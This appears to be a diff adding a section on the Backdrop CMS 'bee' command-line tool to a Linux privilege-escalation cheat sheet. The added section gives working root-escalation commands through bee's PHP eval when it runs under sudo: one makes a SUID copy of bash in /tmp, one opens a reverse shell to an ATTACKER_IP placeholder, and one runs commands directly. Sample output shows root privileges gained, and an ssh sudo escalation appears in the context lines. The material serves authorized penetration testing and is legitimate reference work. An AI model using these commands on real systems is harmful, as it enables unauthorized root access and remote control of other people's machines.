@@ -525,6 +525,48 @@ sudo ssh -o PermitLocalCommand=yes -o LocalCommand='/bin/bash' user@127.0.0.1
 
 **Reference:** https://gtfobins.github.io/gtfobins/ssh/
 
+### bee (Backdrop CMS CLI)
+
+If you can run `bee` with sudo, it has a PHP eval command that allows arbitrary code execution.
+
+**Detection:**
+
+```bash
+sudo -l
+# (ALL : ALL) /usr/local/bin/bee
+```
+
+**Exploitation:**
+
+```bash
+# Must run from Backdrop CMS root directory (e.g., /var/www/html)
+# Or use --root option to specify path
+
+# Method 1 - SUID bash
+sudo /usr/local/bin/bee eval 'echo shell_exec("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash");'
+/tmp/rootbash -p
+
+# Method 2 - Reverse shell
+sudo /usr/local/bin/bee eval 'echo shell_exec("bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1");'
+
+# Method 3 - Direct command
+sudo /usr/local/bin/bee eval 'echo shell_exec("id");'
+```
+
+**Verify:**
+
+```bash
+ls -la /tmp/rootbash
+# -rwsr-sr-x 1 root root 1183448 ... /tmp/rootbash
+
+/tmp/rootbash -p
+# uid=1001(user) gid=1001(user) euid=0(root) egid=0(root)
+```
+
+**Reference:** https://gtfobins.github.io/gtfobins/bee/
+
+---
+
 ### nmap
 
 * Method 1
